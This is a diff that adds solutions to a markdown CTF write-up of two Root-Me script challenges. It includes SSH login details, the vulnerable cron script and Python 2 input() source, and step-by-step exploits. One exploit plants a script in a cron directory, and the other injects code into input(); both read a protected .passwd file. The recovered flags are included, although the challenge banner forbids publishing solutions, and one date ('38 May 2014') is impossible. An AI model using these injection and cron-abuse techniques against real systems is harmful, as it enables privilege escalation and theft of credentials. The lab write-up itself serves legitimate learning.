@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me App - Script Challenges [3/25]
+# [Root-Me](./rootme.md) Root-Me App - Script Challenges [5/25]
 
 Exploit environment weaknesses, configuration mistakes and vulnerability patterns in scripts and systems. 
 
@@ -12,9 +12,9 @@ Exploit environment weaknesses, configuration mistakes and vulnerability pattern
 6. [Bash - unquoted expression injection](#bash-unquoted-expression-injection)
 7. [Perl - Command injection](#perl-command-injection)
 8. [Powershell - SecureString](#powershell-securestring)
-9. [Bash - cron](#bash-cron)
+9. [Bash - cron](#bash-cron) 🗸
 10. [LaTeX - Command execution](#latex-command-execution)
-11. [Python - input()](#python-input)
+11. [Python - input()](#python-input) 🗸
 12. [Bash - quoted expression injection](#bash-quoted-expression)
 13. [Bash - race condition](#bash-race-condition)
 14. [Powershell - Basic jail](#powershell-basic-jail)
@@ -732,20 +732,21 @@ Detail here
 
 ## bash cron
 
-- Author: name
-- X Points
+- Author: g0uZ
+- Date: 06 May 2013
+- Points: 20
+- Level: 2
 
 ### Description
 
-Description Here
-
-### Hints
-
-1. Hint 1
-
-### Connection Details
-
-1. Detail 1
+Connection Information:
+ 
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port: 2222
+- SSH Access: ssh -p 2222 app-script-ch4@challenge02.root-me.org
+- Username: app-script-ch4
+- Password: app-script-ch4
 
 ### Attachments
 
@@ -757,7 +758,134 @@ Description Here
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+Connecting to the challenge server we find python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2 are all available to the user and the password is stored in ~/.passwd:
+
+~~~shell
+$ ssh -p 2222 app-script-ch4@challenge02.root-me.org
+      _           _ _                        ___ ____  
+  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \___ \ 
+ / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |__) |
+| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| / __/ 
+ \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/_____|
+                                 |___/ root-me.org     
+
+app-script-ch4@challenge02.root-me.org's password: 
+     
+                                     ██▒ ▒██░    
+                                 ░███░ █ █ ░███▒    
+                             ░███░        ▓     ███░    
+                           ▓█▓       ▓█░  ▓       ▓███    
+                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██    
+                        ██  ███  ▒░       ▓░████░██    ▓█░    
+                       ██   ▒██      ███      ░▓██      ▒█    
+                      ██             ░█░      ░██        ▓█    
+                     ░█████████████    █     ██░          █▓    
+                     ██                 █ ░██             ██    
+                     ██      ░         ░██▓               ██    
+                     ██  ███    ░██▓░███                 ███    
+                     ▒█          ▓██▓                  ░████    
+                      █▓    ░████                    ░██ ▒█    
+                      ▓█████░                      ███ ███▓    
+                      ▓███                      █████░ ████    
+                       ▓█     ░██▓░         ▒████████░  ██    
+                       ▓█      ██░▒██████████████████░  ██    
+                       ▓█       ███▓██▒  ░██████████░   ██    
+                       ▓█                  ░████▒       ██    
+                        ░██▓           ▒█▓           ▒██░    
+                           ▒██░       ██ ▒█        ██▓    
+                              █▒                  █    
+                              █▒  ░█    █░   █▓   █    
+                              █████████████████████    
+     
+ ████████████▄                             ██    ███             ███    
+ ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄  
+ ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        ██  
+ ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ████████████ 
+ ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██    
+ ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀██████████ 
+
+
+------------------------------------------------------------------------------------------------
+    Welcome on challenge02    /
+-----------------------------‘
+
+/tmp and /var/tmp are writeable
+
+Validation password is stored in $HOME/.passwd
+
+Useful commands available:
+    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2
+
+Attention:
+    Publishing solutions publicly (blog, github, youtube, etc.) is forbidden.
+    Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.
+~~
+
+The directory includes the .passwd file, a ._perms permission list, .git and cron.d and ch4:
+
+~~~shell
+app-script-ch4@challenge02:~$ ls -a
+.  ..  ch4  cron.d  .git  .passwd  ._perms
+app-script-ch4@challenge02:~$ cat .passwd
+cat: .passwd: Permission denied
+~~~
+
+We can view the ch4 bash file:
+
+~~~shell
+app-script-ch4@challenge02:~$ cat ch4
+#!/bin/bash
+
+# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)
+
+# Output of the command 'crontab -l' run as app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# You do NOT need to edit the crontab (it's chattr +i anyway)
+
+# hiding stdout/stderr
+exec 1>/dev/null 2>&1
+
+wdir="cron.d/"
+challdir=${0%/*}
+cd "$challdir"
+
+
+if [ ! -e "/tmp/._cron" ]; then
+    mkdir -m 733 "/tmp/._cron"
+fi
+
+ls -1a "${wdir}" | while read task; do
+    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
+    	timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
+    fi
+    rm -f "${PWD}/${wdir}${task}"
+done
+
+rm -rf cron.d/*
+~~~
+
+We can add a bash script to the cron directory: 
+
+~~~shell
+$ vim cron.d/script.sh
+~~~
+
+With the following script:
+
+~~~bash
+#!/bin/bash
+/bin/cat ../.passwd > /tmp/pwd20220425
+~~~
+
+Saving and running the ch4 bash script, we can recover the password from the new temporary file:
+
+~~~shell
+app-script-ch4@challenge02:~$ ./ch4 
+app-script-ch4@challenge02:~$ cat /tmp/pwd20220425
+Vys3OS3iStUapDj
+~~~
 
 </details>
 
@@ -768,7 +896,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+Vys3OS3iStUapDj
 ~~~
 
 </details>
@@ -830,24 +958,54 @@ Detail here
 
 ## python input
 
-- Author: name
-- X Points
+- Author: g0uZ
+- Date: 38 May 2014
+- Point: 20
+- Level: 2
 
 ### Description
 
-Description Here
+Get the password in the .passwd file by exploiting a vulnerability in this python script.
 
-### Hints
+<details>
 
-1. Hint 1
+<summary markdown="span">Source Code</summary>
+
+~~~py
+    #!/usr/bin/python2
+     
+    import sys
+     
+    def youLose():
+        print "Try again ;-)"
+        sys.exit(1)
+     
+     
+    try:
+        p = input("Please enter password : ")
+    except:
+        youLose()
+     
+     
+    with open(".passwd") as f:
+        passwd = f.readline().strip()
+        try:
+            if (p == int(passwd)):
+                print "Well done ! You can validate with this password !"
+        except:
+            youLose()
+~~~
+
+</details>
 
 ### Connection Details
 
-1. Detail 1
-
-### Attachments
-
-1. Attachment 1
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port: 2222
+- SSH access: ssh -p 2222 app-script-ch6@challenge02.root-me.org
+- Username: app-script-ch6
+- Password: app-script-ch6
 
 ### Solutions
 
@@ -855,7 +1013,21 @@ Description Here
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+This is a simple exploit that involves reading the password from the user input.  We can write a short input command to read the password file:
+
+~~~py
+sys.stdout.write(open(".passwd").readline())
+~~~
+
+We can run using the setuid-wrapper executable:
+
+~~~shell
+app-script-ch6@challenge02:~$ ls
+ch6.py  setuid-wrapper  setuid-wrapper.c
+app-script-ch6@challenge02:~$ ./setuid-wrapper 
+Please enter password : sys.stdout.write(open(".passwd").readline())
+13373439872909134298363103573901
+~~~
 
 </details>
 
@@ -866,7 +1038,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+13373439872909134298363103573901
 ~~~
 
 </details>
